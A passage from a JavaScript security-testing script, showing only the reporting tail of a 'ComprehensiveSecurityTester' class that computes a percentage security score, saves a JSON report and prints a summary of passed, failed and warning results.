      results: this.results
    };

    // Calculate security score
    const totalCritical = report.summary.passed + report.summary.failed;
    const securityScore = totalCritical > 0 ? Math.round((report.summary.passed / totalCritical) * 100) : 0;
    report.security_score = securityScore;

    // Save report
    fs.writeFileSync('security-test-report.json', JSON.stringify(report, null, 2));

    console.log('\n📊 Security Test Summary:');
    console.log(`Total Tests: ${report.summary.total}`);
    console.log(`✅ Passed: ${report.summary.passed}`);
    console.log(`❌ Failed: ${report.summary.failed}`);
    console.log(`⚠️  Warnings: ${report.summary.warnings}`);
    console.log(`🔧 Errors: ${report.summary.errors}`);
    console.log(`🏆 Security Score: ${securityScore}%`);

    if (report.summary.failed > 0) {
      console.log('\n🚨 Critical Security Issues Found:');
      this.results.filter(r => r.status === 'FAIL').forEach(result => {
        console.log(`   • ${result.test}: ${result.message}`);
      });
    }
  }
}

// Run the security tests
if (require.main === module) {
  const tester = new ComprehensiveSecurityTester();
  tester.runAllTests().catch(error => {
    console.error('Security test suite failed:', error);
    process.exit(1);
  });
}

module.exports = ComprehensiveSecurityTester;